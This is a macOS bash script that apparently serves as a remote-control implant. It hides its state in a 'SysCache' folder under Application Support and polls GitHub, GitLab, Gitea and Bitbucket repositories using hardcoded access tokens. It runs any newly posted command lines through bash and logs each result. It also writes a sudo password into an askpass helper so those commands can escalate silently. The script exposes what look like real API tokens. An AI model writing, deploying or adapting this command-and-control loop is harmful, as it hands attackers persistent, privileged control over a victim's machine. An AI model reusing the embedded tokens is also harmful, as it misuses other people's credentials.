#!/bin/bash
set -Eeuo pipefail

############################
# CONFIG
############################
INTERVAL=5
CMD_TIMEOUT=30
CURL_TIMEOUT=15

BASE_DIR="$HOME/Library/Application Support/SysCache"
CONFIG_ABC="$BASE_DIR/.uniq_name"
FILE=""
MAX_RETRY=2
RETRY=0

while [ $RETRY -le $MAX_RETRY ]; do
  if [ -f "$CONFIG_ABC" ]; then
    FILE="$(head -n 1 "$CONFIG_ABC" | tr -d '\r\n ')"
    if [ -n "$FILE" ]; then
      break
    fi
  fi

  if [ $RETRY -lt $MAX_RETRY ]; then
    sleep 5
  fi
  RETRY=$((RETRY+1))
done

if [ -z "$FILE" ]; then
  FILE="test.txt"
fi

echo "Using file: $FILE"


STATE_DIR="$BASE_DIR/state"
LOG_DIR="$BASE_DIR/logs"
mkdir -p "$STATE_DIR" "$LOG_DIR"

############################
# SUDO PASSWORD (OPTIONAL)
############################
SUDO_PASSWORD="kali"

ASKPASS="$(mktemp)"
printf '#!/bin/sh\necho "%s"\n' "$SUDO_PASSWORD" > "$ASKPASS"
chmod +x "$ASKPASS"
export SUDO_ASKPASS="$ASKPASS"
export DISPLAY=:0
trap 'rm -f "$ASKPASS"' EXIT

############################
# TOKENS (READ ONLY)
############################
GITHUB_TOKEN="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"
GITHUB_OWNER="mahesh97m"
GITHUB_REPO="phpcode"

GITLAB_TOKEN="glpat-DClozHjP9aOyT4xotnJs8286MQp1OmpleGs4Cw.01.120o1vpv7"
GITLAB_PROJECT_ID="77391265"
BRANCH="main"

GITEA_TOKEN="ad7ecc45d4f3f1421f62649d755df8b61a3f3c22"
GITEA_OWNER="mahesh2210m"
GITEA_REPO="mahesh2210m"

BITBUCKET_TOKEN="ATCTT3xFfGN0OfF9SvlcZ2obggrqfCavTxQPw74JL2N1eWO6IeblaWQJ51Dy21DniuZWhwRmk4x_sKaVg11x3Sx_BMR7dpyZbYcknW7I3d1Gvhn2QXOd12z54PXDAg6RQ04GTEOeK_sQ_MoKxdrccqwpWy4cWsYhEtreA7Vpcgja4ISA6d77QL4=262DE832"
BITBUCKET_WORKSPACE="mahesh2210m"
BITBUCKET_REPO="mahesh"


############################
# TIME / LOGGING
############################
ts(){ date '+%F %T'; }
log_exec(){ echo "$(ts) | $1" >> "$LOG_DIR/executions.log"; }
log_err(){  echo "$(ts) | $1" >> "$LOG_DIR/errors.log"; }

############################
# SAFE EXEC (macOS TIMEOUT)
############################
run_cmd(){
  local cmd="$1"

  perl -e '
    alarm shift;
    exec @ARGV;
  ' "$CMD_TIMEOUT" bash -c "$cmd" \
  && return 0 || return 1
}

############################
# SAFE CURL (macOS)
############################
safe_curl(){
  perl -e '
    alarm shift;
    exec @ARGV;
  ' "$CURL_TIMEOUT" curl -fsSL "$@" || true
}

############################
# FETCHERS
############################
fetch_github(){
  safe_curl \
    -H "Authorization: token $GITHUB_TOKEN" \
    -H "Accept: application/vnd.github.v3.raw" \
    "https://api.github.com/repos/$GITHUB_OWNER/$GITHUB_REPO/contents/$FILE"
}

fetch_gitlab(){
  safe_curl \
    -H "PRIVATE-TOKEN:$GITLAB_TOKEN" \
    "https://gitlab.com/api/v4/projects/$GITLAB_PROJECT_ID/repository/files/$FILE/raw?ref=$BRANCH"
}

fetch_gitea(){
  safe_curl \
    -H "Authorization: token $GITEA_TOKEN" \
    "https://gitea.com/api/v1/repos/$GITEA_OWNER/$GITEA_REPO/raw/$BRANCH/$FILE"
}

fetch_bitbucket(){
  safe_curl \
    -H "Authorization: Bearer $BITBUCKET_TOKEN" \
    "https://api.bitbucket.org/2.0/repositories/$BITBUCKET_WORKSPACE/$BITBUCKET_REPO/src/$BRANCH/$FILE"
}

############################
# VERSION COMPARE
############################
version_gt(){
  [[ "$(printf '%s\n%s\n' "$1" "$2" | sort -V | tail -n1)" == "$1" && "$1" != "$2" ]]
}

############################
# MAIN LOOP (NEVER BLOCKS)
############################
while true; do

  for SRC in github gitlab gitea bitbucket; do

    CONTENT="$(fetch_$SRC)"
    [[ -z "$CONTENT" ]] && continue

    LAST_FILE="$STATE_DIR/${SRC}_last_version.txt"
    touch "$LAST_FILE"

    LAST_VERSION="$(cat "$LAST_FILE")"
    CURRENT_VERSION="$(echo "$CONTENT" | grep -E '^[0-9]+(\.[0-9]+)*$' | tail -n1)"

    [[ -z "$CURRENT_VERSION" ]] && continue

    if [[ -z "$LAST_VERSION" ]] || version_gt "$CURRENT_VERSION" "$LAST_VERSION"; then

      log_exec "SRC=$SRC NEW_VERSION=$CURRENT_VERSION"

      awk -v ver="$CURRENT_VERSION" '
        $0==ver {f=1; next}
        /^[0-9]+(\.[0-9]+)*$/ && f {exit}
        f && NF
      ' <<< "$CONTENT" | while read -r cmd; do

        log_exec "SRC=$SRC RUN: $cmd"

        if run_cmd "$cmd"; then
          log_exec "SRC=$SRC SUCCESS"
        else
          log_err "SRC=$SRC FAILED or TIMEOUT: $cmd"
        fi

      done

      echo "$CURRENT_VERSION" > "$LAST_FILE"
      log_exec "SRC=$SRC VERSION UPDATED"
    fi

  done

  sleep "$INTERVAL"
done
